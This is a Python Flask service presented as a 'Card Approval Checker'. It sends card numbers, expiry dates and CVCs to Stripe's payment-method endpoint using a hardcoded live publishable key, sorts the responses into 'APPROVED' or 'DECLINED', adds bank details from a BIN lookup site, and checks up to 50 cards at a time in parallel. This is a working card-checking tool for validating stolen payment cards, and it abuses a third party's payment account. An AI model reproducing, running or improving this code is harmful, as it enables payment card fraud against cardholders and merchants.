from flask import Flask, jsonify
import requests
import time
import os
from concurrent.futures import ThreadPoolExecutor
import threading

app = Flask(__name__)

# Global session with connection pooling for better performance
session = requests.Session()
session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20))

# Stripe headers - optimized
STRIPE_HEADERS = {
    'accept': 'application/json',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
}

# Cache for storing results temporarily
result_cache = {}
cache_lock = threading.Lock()

def check_card_stripe(card_data):
    """Ultra-fast Stripe card validation"""
    try:
        # Handle URL encoding
        import urllib.parse
        card_data = urllib.parse.unquote(card_data)
        
        # Parse card data
        parts = card_data.strip().split("|")
        if len(parts) != 4:
            return {"status": "error", "message": "Invalid format: use number|mm|yy|cvc"}
        
        n, mm, yy, cvc = parts
        
        # Validate basic format
        if len(n) < 13 or len(n) > 19 or not n.isdigit():
            return {"status": "error", "message": "Invalid card number"}
        
        if len(mm) != 2 or not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            return {"status": "error", "message": "Invalid month"}
        
        if len(cvc) < 3 or len(cvc) > 4 or not cvc.isdigit():
            return {"status": "error", "message": "Invalid CVV"}
        
        # Fix year format
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        
        # Create payment method with Stripe
        stripe_data = (
            f"type=card&"
            f"card[number]={n}&"
            f"card[exp_month]={mm}&"
            f"card[exp_year]={yy}&"
            f"card[cvc]={cvc}&"
            f"billing_details[name]=Test+User&"
            f"key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr"
        )

        # Make Stripe API call
        response = session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=STRIPE_HEADERS,
            data=stripe_data,
            timeout=10
        )
        
        if response.status_code != 200:
            return {"status": "error", "message": "Stripe API error"}
        
        result = response.json()
        
        # Check for errors in Stripe response
        if "error" in result:
            error_code = result["error"].get("code", "")
            error_message = result["error"].get("message", "")
            
            # Focus on approval status for transactions
            if "incorrect_cvc" in error_code:
                return {"status": "declined", "message": "CVC is incorrect - transaction would be declined", "response": "DECLINED ❌ - Bad CVC"}
            elif "incorrect_zip" in error_code:
                return {"status": "declined", "message": "ZIP code is incorrect - transaction would be declined", "response": "DECLINED ❌ - Bad ZIP"}
            elif "card_declined" in error_code:
                if "insufficient_funds" in error_message.lower():
                    return {"status": "approved", "message": "Card approved but insufficient funds", "response": "APPROVED ✅ - No Funds"}
                elif "generic_decline" in error_message.lower():
                    return {"status": "declined", "message": "Generic decline - bank rejected transaction", "response": "DECLINED ❌ - Bank Reject"}
                elif "do_not_honor" in error_message.lower():
                    return {"status": "declined", "message": "Do not honor - bank blocked transaction", "response": "DECLINED ❌ - Bank Block"}
                elif "transaction_not_allowed" in error_message.lower():
                    return {"status": "declined", "message": "Transaction not allowed - card restricted", "response": "DECLINED ❌ - Restricted"}
                else:
                    return {"status": "declined", "message": "Transaction declined by bank", "response": "DECLINED ❌"}
            elif "expired_card" in error_code:
                return {"status": "declined", "message": "Card expired - transaction would be declined", "response": "DECLINED ❌ - Expired"}
            elif "invalid" in error_code:
                return {"status": "declined", "message": "Invalid card details - transaction would fail", "response": "DECLINED ❌ - Invalid"}
            else:
                return {"status": "declined", "message": "Transaction would be declined", "response": "DECLINED ❌"}
        
        # If no error, card would be approved for transactions
        if result.get("id"):
            return {"status": "approved", "message": "Card approved - transaction would succeed", "response": "APPROVED ✅ - Ready"}
        
        return {"status": "error", "message": "Unknown response from Stripe"}
        
    except requests.exceptions.Timeout:
        return {"status": "error", "message": "Request timeout"}
    except requests.exceptions.RequestException as e:
        return {"status": "error", "message": f"Network error: {str(e)}"}
    except Exception as e:
        return {"status": "error", "message": f"Processing error: {str(e)}"}

def get_bin_info_fast(bin_number):
    """Fast BIN lookup"""
    try:
        response = session.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                "bank": data.get("bank", "N/A"),
                "brand": data.get("brand", "N/A"),
                "type": data.get("type", "N/A"),
                "level": data.get("level", "N/A"),
                "country": data.get("country_name", "N/A"),
                "flag": data.get("country_flag", "")
            }
    except:
        pass
    
    return {
        "bank": "N/A",
        "brand": "N/A", 
        "type": "N/A",
        "level": "N/A",
        "country": "N/A",
        "flag": ""
    }

@app.route('/')
def home():
    return jsonify({
        "service": "⚡ Card Approval Checker ⚡",
        "status": "🟢 ONLINE",
        "purpose": "Check if cards will be APPROVED or DECLINED for transactions",
        "version": "v2.1"
    })

@app.route('/check/<cc>')
def check_card(cc):
    """Main endpoint for card checking"""
    start_time = time.time()
    
    # Check cache first
    with cache_lock:
        if cc in result_cache:
            cached_result = result_cache[cc].copy()
            cached_result["cached"] = True
            return jsonify(cached_result)
    
    # Process card
    result = check_card_stripe(cc)
    
    # Get BIN info in parallel
    bin_number = cc.split("|")[0][:6] if "|" in cc else cc[:6]
    bin_info = get_bin_info_fast(bin_number)
    
    # Calculate processing time
    processing_time = round(time.time() - start_time, 2)
    
    # Format response
    response = {
        "card": cc,
        "status": result["status"],
        "response": result.get("response", result["message"]),
        "message": result["message"],
        "time": f"{processing_time}s",
        "bin": bin_info,
        "cached": False
    }
    
    # Cache successful results
    if result["status"] in ["approved", "declined"]:
        with cache_lock:
            result_cache[cc] = response.copy()
            # Keep cache size manageable
            if len(result_cache) > 1000:
                # Remove oldest 200 entries
                for _ in range(200):
                    result_cache.pop(next(iter(result_cache)), None)
    
    return jsonify(response)

@app.route('/bulk', methods=['POST'])
def bulk_check():
    """Bulk card checking endpoint"""
    from flask import request
    
    try:
        data = request.get_json()
        cards = data.get('cards', [])
        
        if not cards or len(cards) > 50:  # Limit to 50 cards per request
            return jsonify({"error": "Provide 1-50 cards in 'cards' array"}), 400
        
        results = []
        
        # Use ThreadPoolExecutor for parallel processing
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(check_card_stripe, card): card for card in cards}
            
            for future in futures:
                card = futures[future]
                try:
                    result = future.result(timeout=15)
                    bin_info = get_bin_info_fast(card.split("|")[0][:6] if "|" in card else card[:6])
                    
                    results.append({
                        "card": card,
                        "status": result["status"],
                        "response": result.get("response", result["message"]),
                        "bin": bin_info
                    })
                except Exception as e:
                    results.append({
                        "card": card,
                        "status": "error",
                        "response": f"Processing failed: {str(e)}",
                        "bin": {}
                    })
        
        return jsonify({
            "total": len(cards),
            "results": results
        })
        
    except Exception as e:
        return jsonify({"error": f"Bulk processing failed: {str(e)}"}), 500

@app.route('/stats')
def stats():
    """API statistics"""
    with cache_lock:
        cache_size = len(result_cache)
    
    return jsonify({
        "cache_size": cache_size,
        "status": "operational",
        "uptime": "24/7"
    })

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
